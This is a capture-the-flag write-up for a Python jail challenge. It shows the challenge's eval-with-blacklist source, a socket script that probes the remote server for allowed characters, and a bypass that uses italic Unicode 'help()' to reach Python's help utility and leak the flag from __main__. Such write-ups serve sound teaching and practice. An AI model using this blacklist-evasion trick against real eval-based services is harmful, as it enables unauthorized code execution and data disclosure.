---
title: Capital of Italy
layout: default
---

# Capital Of Italy

Nothing... Just a simple pyjail.

- Category: misc
- Challenge file: main.py

### Solution:

##### 1. View the source code for main.py

```py
#!/usr/bin/env python3
REDACTED = "ironCTF{test}"
blacklist = 'REDACTEDREDACTED'
print("WELCOME :)")
breakpoint = "breakpoint"
data = input()

if len(data) > 12:
    print("Too long...")
    exit()

for chars in blacklist:
    if chars in data:
        print("Blocked Character: ", chars)
        exit()
try:
    eval(data)
except Exception as e:
    print("Something went wrong\n", e)
```

The source code checks the length of input which should be less than 12 characters and having a blacklist to check unallowed characters from blacklist. However, we have no clue what are the allowed characters since is `REDACTED`.

##### 2. Script to test allowed characters 

```py
import socket
import string
import time

class CharacterTester:
    def __init__(self, host="misc.1nf1n1ty.team", port=30010):
        self.host = host
        self.port = port

    def test_character(self, char):
        """Test a single character against the server"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.host, self.port))
                sock.recv(1024)

                payload = f"({char})"
                sock.send(payload.encode() + b'\n')
                response = sock.recv(1024).decode()
                return "Blocked Character" not in response

        except Exception as e:
            print(f"Error testing character '{char}': {e}")
            return False

    def test_all_characters(self):
        """Test all printable ASCII characters"""
        allowed_chars = []
        blocked_chars = []

        chars_to_test = string.printable

        print("Starting character testing...")
        print("This may take a few minutes...")

        for char in chars_to_test:
            if char in string.whitespace:
                continue

            print(f"Testing character: {char}", end='\r')

            if self.test_character(char):
                allowed_chars.append(char)
                print(f"\nAllowed character found: {char}")
            else:
                blocked_chars.append(char)
            time.sleep(0.5)

        return allowed_chars, blocked_chars

def main():
    tester = CharacterTester()

    print("Character Testing Tool for PyJail Challenge")
    print("==========================================")
    print(f"Target: {tester.host}:{tester.port}")
    print("Starting tests...\n")

    allowed_chars, blocked_chars = tester.test_all_characters()

    print("\n\nResults:")
    print("========")
    print("\nAllowed characters:")
    print(''.join(sorted(allowed_chars)))
    print(f"Total allowed: {len(allowed_chars)}")

    print("\nBlocked characters:")
    print(''.join(sorted(blocked_chars)))
    print(f"Total blocked: {len(blocked_chars)}")
    with open("char_test_results.txt", "w") as f:
        f.write("PyJail Character Test Results\n")
        f.write("============================\n\n")
        f.write("Allowed characters:\n")
        f.write(''.join(sorted(allowed_chars)))
        f.write(f"\nTotal allowed: {len(allowed_chars)}\n\n")
        f.write("Blocked characters:\n")
        f.write(''.join(sorted(blocked_chars)))
        f.write(f"\nTotal blocked: {len(blocked_chars)}\n")

    print("\nResults have been saved to 'char_test_results.txt'")

if __name__ == "__main__":
    main()
```

And we can test and look at the outcome

```bash
$ python3 test-char.py
Character Testing Tool for PyJail Challenge
==========================================
Target: misc.1nf1n1ty.team:30010
Starting tests...

Starting character testing...
This may take a few minutes...
Testing character: (
Allowed character found: (
Testing character: )
Allowed character found: )
Testing character: ~

Results:
========

Allowed characters:
()
Total allowed: 2

Blocked characters:
!"#$%&'*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
Total blocked: 92

Results have been saved to 'char_test_results.txt'
```

Characters of `(` and `)` is allowed, now we able to craft our payload based on this conditions.

##### 3. Craft payload

Since it check for normal characters and hint of title suggest "Italic" text. Perhaps we can try `𝘩𝘦𝘭𝘱()`

```bash
$ nc misc.1nf1n1ty.team 30010
WELCOME :)
𝘩𝘦𝘭𝘱()

Welcome to Python 3.10's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the internet at https://docs.python.org/3.10/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help>
```

It works !

##### 4. Try calling out main module

```bash
nc misc.1nf1n1ty.team 30010
WELCOME :)
𝘩𝘦𝘭𝘱()

Welcome to Python 3.10's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the internet at https://docs.python.org/3.10/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> __main__
Help on module __main__:

NAME
    __main__

DATA
    __annotations__ = {}
    blacklist = ' \t\n\r\x0b\x0c0123456789abcdefghijklmnopqrstuvwxyzABCDEF...
    breakpoint = 'breakpoint'
    chars = ']'
    data = '𝘩𝘦𝘭𝘱()'
    ffiivVIxistivIX = 'ironCTF{R0M4N_T1mes}'

FILE
    /chal/pwn


help>
```

Summary of outcome:
- `blacklist`: The value appears to be a string containing whitespace characters, digits, and both lowercase and uppercase letters. A blacklist like this might be used to filter out specific characters from user input or to limit allowed characters in a decoding or brute-force process.

- `breakpoint`: This is set to the string 'breakpoint'. It could be used as a debugging indicator or to trigger a specific condition in the script's logic.

- `chars` = ']': This variable holds a single character, ]. It might be used as a delimiter, part of string parsing logic, or to identify a specific end in the text.

- `data` = '𝘩𝘦𝘭𝘱()': This appears to be a Unicode string using mathematical italic characters. It's likely used to obfuscate text or function names, making it harder to understand the code's behavior at first glance.

- `ffiivVIxistivIX = ironCTF{R0M4N_T1mes}`: This is the flag string

**Flag:** `ironCTF{R0M4N_T1mes}`

